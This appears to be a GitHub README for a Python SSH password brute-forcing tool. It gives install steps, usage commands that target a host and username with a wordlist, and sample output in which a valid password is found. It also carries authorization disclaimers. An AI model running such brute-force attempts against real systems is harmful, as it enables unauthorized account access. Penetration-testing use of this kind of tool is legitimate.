# SSH Login Brute

A simple Python script that demonstrates **SSH brute-force password attempts** against a known username on a target host.  
⚠️ **Do not run against systems without explicit authorization.**

## Features

- CLI with `argparse`
- Customizable:
  - `--host` (IP/domain)
  - `--user` (username)
  - `--wordlist` (one password per line)
  - `--port` (default: 22)
  - `--timeout` (default: 1.0s)
- Stops on the first valid password
- Friendly error if the wordlist file is missing

## Installation

```bash
git clone https://github.com/tashauzzz/ssh_login_brute.git
cd ssh_login_brute
python3 -m venv venv
source venv/bin/activate   # Linux/macOS
# venv\Scripts\activate    # Windows PowerShell
pip install -r requirements.txt
```

## Usage

python ssh_login_brute.py --host 127.0.0.1 --user notroot --wordlist ./ssh-common-passwords.txt
python ssh_login_brute.py --host example.com --user admin --wordlist /path/top100.txt --port 22 --timeout 1.5

## Example Output
```
[0] Attempting password: '123456'!
[-] Connecting to 127.0.0.1 on port 22: Failed
[X] Invalid password!
[1] Attempting password: 'password'!
[+] Connecting to 127.0.0.1 on port 22: Done
[*] notroot@127.0.0.1:
    Distro    Kali 2025.2
    OS:       linux
    Arch:     amd64
    Version:  6.12.25
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[>] Valid password found: 'password'!
[*] Closed connection to '127.0.0.1'
```
## Requirements

Python 3.13+
paramiko, pwntools (see requirements.txt)

## Disclaimer

Use only on systems you control or where you have written permission.

